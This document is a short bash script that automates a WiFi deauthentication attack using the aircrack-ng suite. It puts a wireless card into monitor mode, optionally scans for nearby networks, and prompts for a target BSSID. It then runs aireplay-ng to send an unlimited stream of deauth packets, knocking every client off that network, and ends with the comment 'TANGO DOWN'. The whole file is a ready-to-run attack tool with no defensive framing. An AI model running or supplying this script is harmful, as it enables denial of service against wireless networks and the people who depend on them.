#!/bin/bash
# WiFi Deauthetication Script v1.0 Kyle Atkins
# Requires airmon-ng airodump-ng aireplay-ng and wifi card capable of packet injection.
     
#check if user === root
if [ "$UID" -ne 0 ]; then
        echo "Script must be run as root, please login to continue"
        sleep 1
        exit
else
        #start wireless adapter in monitor mode
        echo "Starting wireless adapter in monitor mode"
        sleep 1
        airmon-ng start wlan0
fi
     
sleep 1
     
echo "Would you like to scan for available targets?? (y/n)"
read answer
     
if [ $answer = "y" ] || [ $answer = "Y" ]; then
        ( cmdpid=$BASHPID;
        (sleep 6; kill $cmdpid) & exec airodump-ng mon0 )
fi
     
# Enter BSSID as 00:11:22:33:44:55     
echo -e 'Which BSSID would you like to bring down?? Sample: 00:11:22:33:44:55'
read TARGET
echo "OK, "$TARGET""
echo "/// Starting deauthentication process \\\\"
exec aireplay-ng -0 0 -a $TARGET mon0
     
#TANGO DOWN

